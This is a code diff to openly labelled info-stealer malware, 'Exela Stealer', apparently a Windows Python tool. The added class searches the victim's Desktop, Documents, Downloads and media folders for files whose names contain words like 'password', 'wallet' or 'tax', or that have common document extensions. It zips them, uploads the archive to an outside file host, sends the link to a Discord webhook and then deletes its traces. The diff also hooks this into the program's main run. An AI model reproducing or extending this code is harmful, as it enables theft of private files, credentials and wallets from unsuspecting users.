@@ -1965,6 +1965,74 @@ class UploadGoFile:
             return None
 
 
+class StealCommonFiles:
+    def __init__(self) -> None:
+        self.temp = os.getenv("temp")
+        
+    async def StealFiles(self) -> None:
+        try:
+            source_directories = (
+                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
+                ("Desktop2", os.path.join(os.getenv("userprofile"), "OneDrive", "Desktop")),
+                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
+                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
+                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
+                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
+                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
+            )
+
+            destination_directory = os.path.join(self.temp, "StealedFilesByExela")
+
+            if not os.path.exists(destination_directory):
+                os.makedirs(destination_directory)
+
+            keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup"]
+            allowed_extensions = [".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx", ".zip"]
+            
+            for _, source_path in source_directories:
+                if os.path.isdir(source_path):
+                    for folder_path, _, files in os.walk(source_path):
+                        for file_name in files:
+                            file_path = os.path.join(folder_path, file_name)
+
+                            # Check if the file extension is allowed, if the size is less than 2 MB,
+                            # and if any keyword is present in the file name
+                            _, file_extension = os.path.splitext(file_name)
+                            if (
+                                file_extension.lower() in allowed_extensions
+                                and os.path.getsize(file_path) < 2 * 1024 * 1024
+                                or any(keyword in file_name.lower() for keyword in keywords)
+                            ):
+                                destination_path = os.path.join(destination_directory, file_name)
+                                shutil.copy2(file_path, destination_path)
+
+            shutil.make_archive(destination_directory, 'zip', destination_directory)
+            uploaded_url = await UploadGoFile.upload_file(destination_directory + ".zip")
+            if not uploaded_url == None:
+                async with aiohttp.ClientSession() as session:
+                    embed_data2 = {
+                            "title": "***Exela Stealer***",
+                            "description": f"***Stealed Files***",
+                            "url" : "https://t.me/ExelaStealer",
+                            "color": 0,
+                            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                    fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
+                    embed_data2["fields"] = fields2
+                    payload2 = {
+                                "username": "Exela Stealer",
+                                "embeds": [embed_data2] }
+                    async with session.post(webhook, json=payload2) as req:
+                        pass
+            try:
+                os.remove(destination_directory + ".zip")
+                shutil.rmtree(destination_directory)
+            except:
+                pass
+        except:
+            pass
+
+
 class Startup:
     def __init__(self) -> None:
         self.LocalAppData = os.getenv("LOCALAPPDATA")
@@ -2275,6 +2343,7 @@ if __name__ == '__main__':
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.main())
+            asyncio.run(StealCommonFiles().StealFiles())
             print(f"The code executed on: {str(time.time() - start_time)} second")
     else:
         print("just Windows Operating system's supported by Exela")
